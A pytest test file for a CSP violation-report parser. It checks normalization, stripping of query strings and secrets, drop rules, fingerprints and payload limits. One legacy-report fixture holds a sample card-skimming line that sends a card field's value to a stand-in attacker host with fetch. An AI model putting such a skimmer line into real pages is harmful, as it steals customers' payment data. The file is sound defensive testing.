from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest

from script_sentinel.csp_reports import (
    MAX_POLICY_CHARS,
    DropReason,
    PayloadError,
    UnsupportedContentTypeError,
    Violation,
    check_content_type,
    detect_format,
    is_extension,
    media_type,
    normalize_blocked,
    normalize_directive,
    normalize_legacy,
    normalize_reporting,
    parse_payload,
    strip_url,
)
from script_sentinel.db.models import CspBlockedKind, CspDisposition, CspReportFormat

EXAMPLES = Path(__file__).resolve().parent.parent / "examples" / "csp-reports"
ALLOWED = ["https://shop.example.com"]


def _legacy(**fields: Any) -> dict[str, Any]:
    report = {
        "document-uri": "https://shop.example.com/checkout",
        "effective-directive": "script-src-elem",
        "blocked-uri": "https://cdn.vendor.test/x.js",
        "disposition": "enforce",
    }
    report.update(fields)
    return {k: v for k, v in report.items() if v is not None}


def _reporting(type_: str = "csp-violation", **fields: Any) -> dict[str, Any]:
    body = {
        "documentURL": "https://shop.example.com/",
        "effectiveDirective": "img-src",
        "blockedURL": "https://pixel.test/p.gif",
        "disposition": "report",
    }
    body.update(fields)
    return {"type": type_, "age": 5, "url": body["documentURL"], "body": body}


def _ok(result: Violation | DropReason) -> Violation:
    assert isinstance(result, Violation), result
    return result


# --- URLs, directives, blocked values -----------------------------------------------------


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        (
            "https://Shop.Example.com:443/a/b?x=1#f",
            ("https://shop.example.com/a/b", "shop.example.com"),
        ),
        ("http://user:pw@cdn.test:8080?q", ("http://cdn.test:8080/", "cdn.test")),
        ("wss://live.test:443/socket", ("wss://live.test/socket", "live.test")),
        ("ws://live.test:80", ("ws://live.test/", "live.test")),
        ("https://[2001:db8::1]:8443/x", ("https://[2001:db8::1]:8443/x", "2001:db8::1")),
        ("https://bücher.test/", ("https://xn--bcher-kva.test/", "xn--bcher-kva.test")),
        ("https://example.test./", ("https://example.test/", "example.test")),
    ],
)
def test_strip_url_keeps_origin_and_path(value: str, expected: tuple[str, str]) -> None:
    assert strip_url(value) == expected


@pytest.mark.parametrize(
    "value",
    [
        "ftp://files.test/x",
        "https:///nohost",
        "https://./",
        "https://a b.test/",
        "https://x.test/\x00",
        "https://x.test:99999/",
        "https://" + "a" * 64 + ".test/" + "p" * 2048,
        "https://\udcff.test/",
        "https://a..b.test/",
    ],
)
def test_strip_url_refuses_what_it_cannot_normalize(value: str) -> None:
    assert strip_url(value) is None


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        (None, ("", CspBlockedKind.NONE, None)),
        ("  ", ("", CspBlockedKind.NONE, None)),
        ("inline", ("inline", CspBlockedKind.KEYWORD, None)),
        ("EVAL", ("eval", CspBlockedKind.KEYWORD, None)),
        ("wasm-eval", ("wasm-eval", CspBlockedKind.KEYWORD, None)),
        ("trusted-types-sink", ("trusted-types-sink", CspBlockedKind.KEYWORD, None)),
        (
            "https://Collect.Evil.test/c?card=4111",
            ("https://collect.evil.test/c", CspBlockedKind.URL, "collect.evil.test"),
        ),
        ("data:image/png;base64,iVBORw0KGgo=", ("data:", CspBlockedKind.SCHEME, None)),
        ("blob:https://shop.example.com/uuid", ("blob:", CspBlockedKind.SCHEME, None)),
        ("data", ("data:", CspBlockedKind.SCHEME, None)),
        ("Blob", ("blob:", CspBlockedKind.SCHEME, None)),
        ("javascript:void(0)", ("javascript:", CspBlockedKind.SCHEME, None)),
        ("ftp://files.test/x", ("ftp://files.test/x", CspBlockedKind.OTHER, None)),
        ("https://bad host/", ("https://bad host/", CspBlockedKind.OTHER, None)),
        ("not a url\x07", ("not a url", CspBlockedKind.OTHER, None)),
    ],
)
def test_normalize_blocked(value: str | None, expected: tuple[str, CspBlockedKind, str]) -> None:
    blocked = normalize_blocked(value)
    assert (blocked.value, blocked.kind, blocked.host) == expected


def test_other_blocked_values_are_truncated() -> None:
    assert len(normalize_blocked("x y" * 500).value) == 256


@pytest.mark.parametrize(
    ("effective", "violated", "expected"),
    [
        ("script-src-elem", None, "script-src-elem"),
        (" Connect-Src ", None, "connect-src"),
        (None, "script-src 'self' https://cdn.test", "script-src"),
        ("", "img-src data:", "img-src"),
        (None, None, None),
        ("  ", "   ", None),
        ("script_src", None, None),
        ("<svg>", None, None),
        ("a" * 65, None, None),
    ],
)
def test_normalize_directive(
    effective: str | None, violated: str | None, expected: str | None
) -> None:
    assert normalize_directive(effective, violated) == expected


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        ("chrome-extension://abc/inject.js", True),
        ("moz-extension://abc/x.js", True),
        ("safari-web-extension://abc/x.js", True),
        ("moz-extension", True),
        ("https://shop.example.com/", False),
        ("inline", False),
        ("", False),
        (None, False),
    ],
)
def test_is_extension(value: str | None, expected: bool) -> None:
    assert is_extension(value) is expected


def test_media_type_and_content_type_check() -> None:
    assert media_type("Application/CSP-Report; charset=utf-8") == "application/csp-report"
    assert media_type(None) == ""
    assert check_content_type("application/reports+json") == "application/reports+json"
    with pytest.raises(UnsupportedContentTypeError, match="'text/plain'"):
        check_content_type("text/plain")
    with pytest.raises(UnsupportedContentTypeError, match="none"):
        check_content_type(None)


@pytest.mark.parametrize(
    ("payload", "content_type", "expected"),
    [
        ([], "application/reports+json", CspReportFormat.REPORTING_API),
        ([], "application/json", CspReportFormat.REPORTING_API),
        ({}, "application/csp-report", CspReportFormat.CSP_REPORT),
        ({}, "application/json", CspReportFormat.CSP_REPORT),
    ],
)
def test_detect_format(payload: Any, content_type: str, expected: CspReportFormat) -> None:
    assert detect_format(payload, content_type) is expected


@pytest.mark.parametrize(
    ("payload", "content_type", "message"),
    [
        ({}, "application/reports+json", "an array of reports"),
        ([], "application/csp-report", "csp-report"),
        ("text", "application/json", "csp-report"),
    ],
)
def test_detect_format_refuses_a_contradicting_shape(
    payload: Any, content_type: str, message: str
) -> None:
    with pytest.raises(PayloadError, match=message):
        detect_format(payload, content_type)


# --- One report -----------------------------------------------------------------------------


def test_a_legacy_report_is_normalized_and_stripped() -> None:
    violation = _ok(
        normalize_legacy(
            _legacy(
                **{
                    "document-uri": "https://SHOP.example.com:443/checkout?email=a%40b.test#x",
                    "referrer": "https://shop.example.com/cart?token=secret",
                    "blocked-uri": "https://collect.evil.test/c.js?card=4111",
                    "source-file": "https://shop.example.com/checkout?order=1",
                    "line-number": "12",
                    "column-number": 7,
                    "status-code": 200,
                    "script-sample": "  fetch('https://collect.evil.test/'+cc.value)  \n",
                    "original-policy": "  script-src 'self'  ",
                }
            ),
            ALLOWED,
        )
    )
    assert violation.format is CspReportFormat.CSP_REPORT
    assert violation.document_url == "https://shop.example.com/checkout"
    assert violation.blocked.value == "https://collect.evil.test/c.js"
    assert violation.blocked.host == "collect.evil.test"
    assert violation.source_file == "https://shop.example.com/checkout"
    assert (violation.line, violation.column, violation.status_code) == (12, 7, 200)
    assert violation.sample == "fetch('https://collect.evil.test/'+cc.va"
    assert len(violation.sample) == 40
    assert violation.original_policy == "script-src 'self'"
    assert violation.policy_sha256 is not None
    assert violation.disposition is CspDisposition.ENFORCE
    # Nothing from the query, the fragment or the referrer survives.
    assert "secret" not in repr(violation)
    assert "4111" not in repr(violation)
    assert "a%40b" not in repr(violation)


def test_old_browsers_violated_directive_and_missing_disposition() -> None:
    violation = _ok(
        normalize_legacy(
            _legacy(
                **{
                    "effective-directive": None,
                    "disposition": None,
                    "violated-directive": "style-src 'self'",
                    "blocked-uri": "self",
                    "script-sample": "",
                    "original-policy": " ",
                }
            ),
            ALLOWED,
        )
    )
    assert violation.effective_directive == "style-src"
    assert violation.disposition is CspDisposition.UNKNOWN
    assert violation.blocked.kind is CspBlockedKind.KEYWORD
    assert violation.sample is None
    assert violation.original_policy is None
    assert violation.policy_sha256 is None


def test_long_policies_are_truncated_but_hashed_in_full() -> None:
    long_a = "script-src " + "a" * 5000
    long_b = "script-src " + "a" * 4999 + "b"
    a = _ok(normalize_legacy(_legacy(**{"original-policy": long_a}), ALLOWED))
    b = _ok(normalize_legacy(_legacy(**{"original-policy": long_b}), ALLOWED))
    assert a.original_policy is not None
    assert len(a.original_policy) == MAX_POLICY_CHARS
    assert a.original_policy == b.original_policy
    assert a.policy_sha256 != b.policy_sha256


@pytest.mark.parametrize(
    ("fields", "reason"),
    [
        ({"document-uri": "https://evil.test/checkout"}, DropReason.FOREIGN_DOCUMENT),
        ({"document-uri": "https://shop.example.com:8443/"}, DropReason.FOREIGN_DOCUMENT),
        ({"document-uri": "about:blank"}, DropReason.INVALID),
        ({"document-uri": "https://user:pw@shop.example.com/"}, DropReason.INVALID),
        ({"document-uri": 42}, DropReason.INVALID),
        ({"document-uri": None}, DropReason.INVALID),
        ({"effective-directive": "<script>"}, DropReason.INVALID),
        ({"effective-directive": None}, DropReason.INVALID),
        ({"disposition": "maybe"}, DropReason.INVALID),
        ({"line-number": -1}, DropReason.INVALID),
        ({"status-code": 1000}, DropReason.INVALID),
        ({"script-sample": "x" * 20_000}, DropReason.INVALID),
        ({"blocked-uri": "chrome-extension://abc/x.js"}, DropReason.EXTENSION),
        ({"source-file": "moz-extension://abc/content.js"}, DropReason.EXTENSION),
    ],
)
def test_legacy_reports_that_are_dropped(fields: dict[str, Any], reason: DropReason) -> None:
    assert normalize_legacy(_legacy(**fields), ALLOWED) is reason


def test_a_document_url_on_the_allowlist_that_cannot_be_stripped_is_invalid() -> None:
    # origin_of accepts a space-free URL that strip_url still refuses: an overlong one.
    long_url = "https://shop.example.com/" + "p" * 2100
    assert normalize_legacy(_legacy(**{"document-uri": long_url}), ALLOWED) is DropReason.INVALID


def test_a_reporting_api_report_is_normalized() -> None:
    violation = _ok(
        normalize_reporting(
            _reporting(
                effectiveDirective="script-src-elem",
                blockedURL="inline",
                lineNumber=14,
                columnNumber=9,
                sourceFile="https://shop.example.com/?utm=1",
                sample="gtag()",
                statusCode=200,
                originalPolicy="script-src 'self'",
            ),
            ALLOWED,
        )
    )
    assert violation.format is CspReportFormat.REPORTING_API
    assert violation.document_url == "https://shop.example.com/"
    assert violation.blocked.kind is CspBlockedKind.KEYWORD
    assert violation.source_file == "https://shop.example.com/"
    assert violation.disposition is CspDisposition.REPORT
    assert violation.sample == "gtag()"


@pytest.mark.parametrize(
    ("report", "reason"),
    [
        ("not an object", DropReason.INVALID),
        ({"body": {}}, DropReason.INVALID),
        ({"type": "x" * 65}, DropReason.INVALID),
        ({"type": "deprecation", "body": {"id": "x"}}, DropReason.NOT_CSP),
        ({"type": "csp-violation"}, DropReason.INVALID),
        ({"type": "csp-violation", "body": {"documentURL": ["x"]}}, DropReason.INVALID),
        (_reporting(documentURL="https://other.test/"), DropReason.FOREIGN_DOCUMENT),
        (_reporting(blockedURL="safari-extension://x/y.js"), DropReason.EXTENSION),
        (_reporting(effectiveDirective=None), DropReason.INVALID),
    ],
)
def test_reporting_api_reports_that_are_dropped(report: Any, reason: DropReason) -> None:
    assert normalize_reporting(report, ALLOWED) is reason


# --- Fingerprints ---------------------------------------------------------------------------


def test_fingerprints_ignore_what_varies_between_reports_of_one_problem() -> None:
    base = _ok(normalize_reporting(_reporting(lineNumber=1, columnNumber=10), ALLOWED))
    same = [
        _reporting(lineNumber=1, columnNumber=99),  # minified code: columns move
        _reporting(documentURL="https://shop.example.com/?page=2", lineNumber=1),
        _reporting(blockedURL="https://pixel.test/p.gif?id=999", lineNumber=1),
        _reporting(sample="different", originalPolicy="img-src 'none'", lineNumber=1),
    ]
    for report in same:
        assert _ok(normalize_reporting(report, ALLOWED)).fingerprint() == base.fingerprint()
    # A legacy report of the same problem is the same group.
    legacy = _legacy(
        **{
            "document-uri": "https://shop.example.com/",
            "effective-directive": "img-src",
            "blocked-uri": "https://pixel.test/p.gif",
            "disposition": "report",
            "line-number": 1,
        }
    )
    assert _ok(normalize_legacy(legacy, ALLOWED)).fingerprint() == base.fingerprint()


def test_fingerprints_tell_different_problems_apart() -> None:
    base = _ok(normalize_reporting(_reporting(), ALLOWED)).fingerprint()
    different = [
        _reporting(documentURL="https://shop.example.com/other"),
        _reporting(effectiveDirective="connect-src"),
        _reporting(blockedURL="https://pixel.test/other.gif"),
        _reporting(disposition="enforce"),
        _reporting(sourceFile="https://shop.example.com/app.js"),
        _reporting(lineNumber=2),
    ]
    prints = {_ok(normalize_reporting(r, ALLOWED)).fingerprint() for r in different}
    assert base not in prints
    assert len(prints) == len(different)


# --- Payloads -------------------------------------------------------------------------------


def test_the_example_report_uri_payload() -> None:
    parsed = parse_payload(
        (EXAMPLES / "report-uri.json").read_bytes(),
        "application/csp-report",
        ALLOWED,
        max_reports=100,
    )
    assert parsed.format is CspReportFormat.CSP_REPORT
    assert parsed.received == 1
    assert not parsed.dropped
    (violation,) = parsed.violations
    assert violation.blocked.host == "collect.skim.test"
    assert violation.disposition is CspDisposition.REPORT


def test_the_example_reporting_api_batch() -> None:
    parsed = parse_payload(
        (EXAMPLES / "reporting-api.json").read_bytes(),
        "application/reports+json",
        ALLOWED,
        max_reports=100,
    )
    assert parsed.format is CspReportFormat.REPORTING_API
    assert parsed.received == 6
    assert dict(parsed.dropped) == {
        DropReason.EXTENSION: 1,
        DropReason.FOREIGN_DOCUMENT: 1,
        DropReason.NOT_CSP: 1,
    }
    assert len(parsed.violations) == 3
    # The two beacon reports differ only in query strings and age: one group.
    assert len({v.fingerprint() for v in parsed.violations}) == 2


def test_batches_beyond_the_limit_are_dropped_unread() -> None:
    body = json.dumps([_reporting()] * 5 + ["garbage"] * 3).encode()
    parsed = parse_payload(body, "application/reports+json", ALLOWED, max_reports=5)
    assert parsed.received == 8
    assert len(parsed.violations) == 5
    assert dict(parsed.dropped) == {DropReason.BATCH_LIMIT: 3}


def test_a_legacy_payload_with_a_bad_report_is_counted_not_refused() -> None:
    body = json.dumps({"csp-report": _legacy(**{"line-number": "x"})}).encode()
    parsed = parse_payload(body, "application/csp-report", ALLOWED, max_reports=5)
    assert (parsed.received, parsed.violations) == (1, [])
    assert dict(parsed.dropped) == {DropReason.INVALID: 1}


@pytest.mark.parametrize(
    ("body", "content_type", "error"),
    [
        (b"{}", "text/plain", UnsupportedContentTypeError),
        (b"not json", "application/csp-report", PayloadError),
        (b"\xff\xfe", "application/json", PayloadError),
        (b"[" * 100_000 + b"]" * 100_000, "application/json", PayloadError),
        (b'{"report": {}}', "application/csp-report", PayloadError),
        (b'{"csp-report": []}', "application/csp-report", PayloadError),
        (b"[]", "application/csp-report", PayloadError),
        (b'{"csp-report": {}}', "application/reports+json", PayloadError),
    ],
)
def test_payloads_that_are_refused(body: bytes, content_type: str, error: type[Exception]) -> None:
    with pytest.raises(error):
        parse_payload(body, content_type, ALLOWED, max_reports=5)


def test_the_content_type_is_checked_before_the_body_is_parsed() -> None:
    with pytest.raises(UnsupportedContentTypeError):
        parse_payload(b"not json", "text/html", ALLOWED, max_reports=5)
